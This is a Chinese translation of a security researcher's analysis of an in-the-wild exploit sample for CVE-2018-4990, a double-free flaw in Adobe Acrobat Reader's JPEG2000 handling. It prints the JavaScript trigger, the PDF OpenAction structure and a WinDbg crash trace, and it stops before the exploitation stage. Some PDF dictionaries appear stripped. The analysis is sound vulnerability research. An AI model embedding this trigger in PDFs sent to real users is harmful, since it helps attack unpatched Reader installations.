# Adobe双重释放安全漏洞(CVE-2018-4990)的0day利用样本分析
|
##### 译文声明
本文是翻译文章，文章来源：https://srcincite.io/
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
最近，我刚刚得到了CVE-2018-4990的漏洞利用样本，这是一个影响Acrobat
Reader的0-Day漏洞，在近期，Adobe发布了APSB18-09补丁包（
）对该漏洞进行了修复。来自ESET的Anton Cherepanov（
）前几天写过一篇关于该漏洞的文章《两个0-Day漏洞的故事》（
），这是一篇不错的分析，但对于我来说，该篇文章却缺少了一些重要的东西，比如双重释放是如何被实际利用的。  
在本文中，我将主要分析攻击者如何利用该漏洞，通过一个特殊的JPEG2000图像而触发Acrobat Reader双重释放（Double Free）漏洞。
## 概述
目前，能够在野外发现Acrobat
Reader的漏洞是一件非常罕见的事情。因此，我决定对这一漏洞利用样本进行分析。本文中所涉及的所有分析过程是在v2018.011.20035版本的AcroRd32.exe
（c4c6f8680efeedafa4bb7a71d1a6f0cd37529ffc）下完成的。除该版本之外，目前已知其他版本也受到此漏洞的影响，具体请参阅Adobe的公告APSB18-09（
 ）了解更多详情。
## 深入漏洞的根源
在PDF中，由于有许多对象被压缩，因此也就隐藏了例如JavaScript和图像之类的真正功能，因此我需要做的第一件事，就是对PDF进行解压缩。我喜欢使用PDF
Toolkit（ 
），因为它是以命令行的方式来使用的。
    c:> pdftk 4b672deae5c1231ea20ea70b0bf091164ef0b939e2cf4d142d31916a169e8e01 output poc.pdf uncompress
由于我没有JPEG2000图像的原始样本，因此我并不知道该图像是否已经被位反转（Bitflipped）过，因此我在这里只能对JavaScript进行深入研究。在忽略掉JavaScript的其他部分之后，我们发现了下面代码，可以触发双重释放：
    function trigger(){
        var f1 = this.getField("Button1");
        if(f1){
            f1.display = display.visible;
        }
    }
    trigger();
JavaScript来源于根结点触发的OpenAction：
    1 0 obj 
    >
    stream
    function trigger(){
        var f1 = this.getField("Button1");
        if(f1){
            f1.display = display.visible;
        }
    }
    trigger();
    endstream 
    endobj
    ...
    5 0 obj 
    >
    endobj 
    6 0 obj 
    >
    endobj 
    ...
    trailer
    >
在启用页堆（Page Heap）和用户模式栈跟踪（User-mode Stack Traces）的情况下，我们会得到以下崩溃信息：
    (a48.1538): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    eax=d0d0d0b0 ebx=00000000 ecx=d0d0d000 edx=d0d0d0b0 esi=020e0000 edi=020e0000
    eip=66886e88 esp=0022a028 ebp=0022a074 iopl=0         nv up ei ng nz na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010286
    verifier!AVrfpDphFindBusyMemoryNoCheck+0xb8:
    66886e88 813abbbbcdab    cmp     dword ptr [edx],0ABCDBBBBh ds:0023:d0d0d0b0=????????
    0:000> kv
    ChildEBP RetAddr  Args to Child              
    0022a074 66886f95 020e1000 d0d0d0d0 020e0000 verifier!AVrfpDphFindBusyMemoryNoCheck+0xb8 (FPO: [SEH])
    0022a098 66887240 020e1000 d0d0d0d0 0022a108 verifier!AVrfpDphFindBusyMemory+0x15 (FPO: [2,5,0])
    0022a0b4 66889080 020e1000 d0d0d0d0 0078d911 verifier!AVrfpDphFindBusyMemoryAndRemoveFromBusyList+0x20 (FPO: [2,3,0])
    0022a0d0 777969cc 020e0000 01000002 d0d0d0d0 verifier!AVrfDebugPageHeapFree+0x90 (FPO: [3,3,0])
    0022a118 77759e07 020e0000 01000002 d0d0d0d0 ntdll!RtlDebugFreeHeap+0x2f (FPO: [SEH])
    0022a20c 777263a6 00000000 d0d0d0d0 387e2f98 ntdll!RtlpFreeHeap+0x5d (FPO: [SEH])
    0022a22c 7595c614 020e0000 00000000 d0d0d0d0 ntdll!RtlFreeHeap+0x142 (FPO: [3,1,4])
    0022a240 5df7ecfa 020e0000 00000000 d0d0d0d0 kernel32!HeapFree+0x14 (FPO: [3,0,0])
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Program FilesAdobeAcrobat Reader DCReaderJP2KLib.dll - 
    0022a254 667d0574 d0d0d0d0 7ea9257c 69616fac MSVCR120!free+0x1a (FPO: [Non-Fpo]) (CONV: cdecl) [f:ddvctoolscrtcrtw32heapfree.c @ 51]
    WARNING: Stack unwind information not available. Following frames may be wrong.
    0022a374 667e6482 35588fb8 4380cfd8 000000fd JP2KLib!JP2KCopyRect+0xbae6
    *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:Program FilesAdobeAcrobat Reader DCReaderAcroRd32.dll - 
    0022a3cc 511d6cfc 36496e88 68d96fd0 4380cfd8 JP2KLib!JP2KImageInitDecoderEx+0x24
    0022a454 511d8696 3570afa8 69616fac 3570afa8 AcroRd32_50be0000!AX_PDXlateToHostEx+0x261843
    0022a4b4 511cd785 69616fac 0022a4d4 511d6640 AcroRd32_50be0000!AX_PDXlateToHostEx+0x2631dd
    0022a4c0 511d6640 69616fac 462f6f70 41826fc8 AcroRd32_50be0000!AX_PDXlateToHostEx+0x2582cc
    0022a4d4 50dc030d 69616fac 41826fd0 41826fc8 AcroRd32_50be0000!AX_PDXlateToHostEx+0x261187
    0022a510 50dbf92b c0010000 0000000d 41826fc8 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x7867d
    0022a5e0 50dbebc6 0022a988 00000000 60b2d137 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x77c9b
    0022a930 50dbeb88 0022a988 45c3aa50 60b2d163 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x76f36
    0022a964 50dbea71 41826e28 45c3aa50 0022aa1c AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x76ef8
    0022a9d0 50dbd949 c0010000 0000000d 45c3aa50 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x76de1
我们可以看到，释放的调用者是JP2KLib!JP2KCopyRect+0xbae6，接下来让我们深入该函数，来看看第二次释放是在哪里被触发的。  